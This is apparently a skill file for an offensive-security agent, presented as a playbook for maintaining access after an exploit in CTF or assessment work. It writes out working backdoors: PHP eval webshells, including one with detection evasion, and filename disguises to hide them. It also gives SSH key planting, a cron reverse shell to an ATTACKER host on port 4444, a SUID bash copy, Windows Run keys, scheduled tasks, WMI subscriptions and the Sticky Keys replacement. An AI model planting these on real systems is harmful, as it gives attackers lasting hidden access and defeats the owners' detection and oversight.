name: persistence
description: Post-exploitation persistence — establish access that survives the original exploit: webshell deployment, SSH authorized_keys, cron/systemd/bashrc backdoors (Linux), and registry Run keys / scheduled tasks / WMI subscriptions (Windows). Use after gaining access, to keep a reliable channel during a long engagement.
---

# Persistence (maintain access)

Authorized CTF/assessment use. Persistence = a backdoor that doesn't depend on the original vuln. In CTF it's insurance (keep your shell if the box resets or you lose the exploit); in engagements it's continuity. Deploy the cheapest reliable one, not the fanciest.

## 1. Web layer — webshell

**Deploy in a hidden/static location:**
```php
<?php @eval($_POST['c']);?>                          # one-liner
<?php $a='sys'.'tem'; $a($_GET['c']);?>              # string-concat evasion
```
**Disguise the filename:** `.htaccess`, `config.bak.php`, `error_log.php`, `.user.ini` — or append to an existing file. Access it later via `http://target/path/shell.php?c=id`.

## 2. Linux persistence

```
决策: 有 SSH? → authorized_keys (最可靠, 最隐蔽)
      echo "<my_pubkey>" >> ~/.ssh/authorized_keys
需要自动回连? → cron 反弹
      (crontab -l; echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1") | crontab -
需要隐蔽? → systemd 服务 / ~/.bashrc 后门
快速后门? → SUID shell: cp /bin/bash /tmp/.x && chmod u+s /tmp/.x
```

## 3. Windows persistence

```
管理员权限 → WMI 事件订阅 (最难检测)  / 服务 (sc create ... binPath=cmd)
开机启动 → 注册表 Run 键: HKLM\...\CurrentVersion\Run
          计划任务: schtasks /create /tn X /tr "payload" /sc onstart
RDP 访问 → Sticky Keys 后门 (替换 sethc.exe)
```

## 4. When to persist

- Long engagement / a box you'll need to revisit after losing the shell.
- When you're about to do something risky (exploit may crash the service) — persist FIRST.
- Multi-stage: persist on the pivot host so you don't re-exploit it every hop.

## Cross-cutting
- **Persist before the risky move** — if the exploit crashes the box, your backdoor survives.
- **Match the method to the platform** — authorized_keys (Linux) vs Run key (Windows) vs webshell (web).
- Self-verify: reconnect through the backdoor from a fresh session before relying on it.
